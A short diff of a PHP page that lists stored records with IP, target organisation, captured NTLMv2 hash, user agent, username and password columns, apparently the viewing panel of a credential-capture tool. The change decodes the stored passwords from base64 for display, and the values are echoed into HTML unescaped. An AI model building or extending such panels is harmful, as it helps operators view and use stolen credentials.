@@ -252,7 +252,7 @@ $result = $conn->query($sql);
     // output data of each row
     while($row = $result->fetch_assoc()) {
 //$pw = $row["pass"];
-echo "<tr><td>".$row["Datetime"]."</td><td>".$row["IP"]."</td><td>".$row["Target"]."</td><td>".$row["Org"]."</td><td>".$row["NTLMv2"]."</td><td>".$row["UA"]."</td><td>".$row['User']."</td><td>".$row['Pass']."</td></tr>";
+echo "<tr><td>".$row["Datetime"]."</td><td>".$row["IP"]."</td><td>".$row["Target"]."</td><td>".$row["Org"]."</td><td>".$row["NTLMv2"]."</td><td>".$row["UA"]."</td><td>".$row['User']."</td><td>".base64_decode($row['Pass'])."</td></tr>";
     }
 
 printf($conn->error);
